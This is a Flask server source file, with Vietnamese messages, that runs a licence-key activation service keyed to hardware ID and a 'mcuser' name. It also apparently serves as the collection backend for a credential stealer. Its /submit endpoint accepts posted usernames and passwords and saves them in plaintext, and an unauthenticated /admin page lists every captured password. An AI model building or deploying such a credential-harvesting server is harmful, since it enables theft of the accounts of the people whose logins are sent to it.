from flask import Flask, request, jsonify, render_template_string, redirect, url_for
import json, os
from datetime import datetime

app = Flask(__name__)
DB = 'used_users.json'
LICENSE_DB = 'licenses.json'
USED_KEYS_DB = 'used_keys.json'

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; padding: 20px; }
        h1 { color: #90caf9; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; }
        th { background-color: #1e1e1e; }
        tr:nth-child(even) { background-color: #1a1a1a; }
        form { display: inline; }
        button { background-color: #e57373; border: none; padding: 5px 10px; color: #fff; cursor: pointer; border-radius: 4px; }
        button:hover { background-color: #ef5350; }
    </style>
</head>
<body>
    <h1>🔐 Admin Panel</h1>
    {% if records %}
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Time</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                {% for r in records %}
                <tr>
                    <td>{{ loop.index }}</td>
                    <td>{{ r.user }}</td>
                    <td>{{ r.password }}</td>
                    <td>{{ r.time }}</td>
                    <td>
                        <form method="POST" action="/delete/{{ loop.index0 }}">
                            <button type="submit">Delete</button>
                        </form>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    {% else %}
        <p>Không có log nào.</p>
    {% endif %}
</body>
</html>
'''

@app.route("/")
def home():
    return "✅ Server is running."

@app.route("/submit", methods=["POST"])
def submit():
    data = request.json
    if not isinstance(data, dict) or "user" not in data or "password" not in data:
        return jsonify({"status": "error", "message": "invalid payload"}), 400

    records = []
    if os.path.exists(DB):
        with open(DB, 'r') as f:
            try:
                records = json.load(f)
            except json.JSONDecodeError:
                records = []

    data["time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    records.append(data)
    with open(DB, 'w') as f:
        json.dump(records, f, indent=2)

    return jsonify({"status": "ok"})

@app.route("/admin", methods=["GET"])
def admin_panel():
    records = []
    if os.path.exists(DB):
        with open(DB, 'r') as f:
            try:
                records = json.load(f)
            except json.JSONDecodeError:
                records = []
    return render_template_string(HTML_TEMPLATE, records=records)

@app.route("/delete/<int:index>", methods=["POST"])
def delete_entry(index):
    if os.path.exists(DB):
        with open(DB, 'r') as f:
            try:
                records = json.load(f)
            except json.JSONDecodeError:
                records = []

        if 0 <= index < len(records):
            records.pop(index)
            with open(DB, 'w') as f:
                json.dump(records, f, indent=2)

    return redirect(url_for('admin_panel'))

@app.route("/activate-key", methods=["POST"])
def activate_key():
    data = request.json
    if not isinstance(data, dict):
        return "Invalid data format", 400

    key = data.get("key")
    hwid = data.get("hwid")
    mcuser = data.get("mcuser")

    if not key or not hwid or not mcuser:
        return "Missing required fields", 400

    licenses = {}
    used_keys = {}

    if os.path.exists(LICENSE_DB):
        with open(LICENSE_DB, 'r') as f:
            try:
                licenses = json.load(f)
            except json.JSONDecodeError:
                licenses = {}

    if os.path.exists(USED_KEYS_DB):
        with open(USED_KEYS_DB, 'r') as f:
            try:
                used_keys = json.load(f)
            except json.JSONDecodeError:
                used_keys = {}

    if key in used_keys:
        entry = used_keys[key]
        if entry.get("hwid") == hwid and entry.get("used_by") == mcuser:
            return jsonify({"status": "ok"})
        return jsonify({
            "status": "error",
            "message": "Key đã được sử dụng bởi thiết bị khác.",
            **entry
        }), 403

    if key not in licenses:
        return jsonify({"status": "invalid", "message": "Key không tồn tại trong danh sách cấp phép."}), 403

    used_keys[key] = {
        "used_by": mcuser,
        "hwid": hwid,
        "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    licenses.pop(key, None)

    with open(LICENSE_DB, 'w') as f:
        json.dump(licenses, f, indent=2)
    with open(USED_KEYS_DB, 'w') as f:
        json.dump(used_keys, f, indent=2)

    return jsonify({"status": "ok"})

@app.route("/check-key", methods=["POST"])
def check_key():
    data = request.json
    key = data.get("key")

    if not key:
        return jsonify({"status": "error", "message": "Thiếu key."}), 400

    licenses = {}
    used_keys = {}

    if os.path.exists(LICENSE_DB):
        with open(LICENSE_DB, 'r') as f:
            try:
                licenses = json.load(f)
            except json.JSONDecodeError:
                licenses = {}

    if os.path.exists(USED_KEYS_DB):
        with open(USED_KEYS_DB, 'r') as f:
            try:
                used_keys = json.load(f)
            except json.JSONDecodeError:
                used_keys = {}

    if key in licenses:
        return jsonify({"status": "available", "message": "Key hợp lệ và chưa được sử dụng."})
    elif key in used_keys:
        return jsonify({"status": "used", **used_keys[key]})
    else:
        return jsonify({"status": "invalid", "message": "Key không tồn tại."}), 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
